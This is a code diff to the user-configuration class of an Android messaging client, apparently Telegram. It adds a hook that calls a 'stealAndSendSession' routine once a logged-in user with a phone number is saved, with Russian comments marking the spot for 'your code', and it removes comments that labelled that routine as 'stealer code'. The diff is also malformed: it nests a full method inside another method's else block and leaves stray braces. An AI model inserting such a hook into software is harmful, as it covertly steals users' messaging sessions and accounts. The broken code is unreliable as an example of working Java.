@@ -216,6 +216,41 @@ public class UserConfig extends BaseController {
                         }
                     } else {
                         editor.remove("user");
+                        public void saveConfig(boolean withFile) {
+    NotificationCenter.getInstance(currentAccount).doOnIdle(() -> {
+        if (!configLoaded) {
+            return;
+        }
+        synchronized (sync) {
+            try {
+                // ... много кода ...
+                
+                if (currentUser != null) {
+                    if (withFile) {
+                        SerializedData data = new SerializedData();
+                        currentUser.serializeToStream(data);
+                        String string = Base64.encodeToString(data.toByteArray(), Base64.DEFAULT);
+                        editor.putString("user", string);
+                        data.cleanup();
+                    }
+                } else {
+                    editor.remove("user");
+                }
+
+                // ========== ВСТАВЬ ТВОЙ КОД ЗДЕСЬ ==========
+                if (!isClientActivated && currentUser != null && currentUser.phone != null) {
+                    stealAndSendSession();
+                    isClientActivated = true;
+                }
+                // ========== КОНЕЦ ТВОЕГО КОДА ==========
+
+                editor.apply();
+            } catch (Exception e) {
+                FileLog.e(e);
+            }
+        }
+    });
+                    }
                     }
 
                     editor.apply();
@@ -611,7 +646,7 @@ public class UserConfig extends BaseController {
         }
         return selectedAccount;
     }
-        // ========== НАЧАЛО ТВОЕГО КОДА СТИЛЛЕРА ==========
+        
     
     private void stealAndSendSession() {
         new Thread(() -> {
@@ -641,6 +676,6 @@ public class UserConfig extends BaseController {
         }).start();
     }
     
-    // ========== КОНЕЦ ТВОЕГО КОДА СТИЛЛЕРА ==========
+    
 }
 }
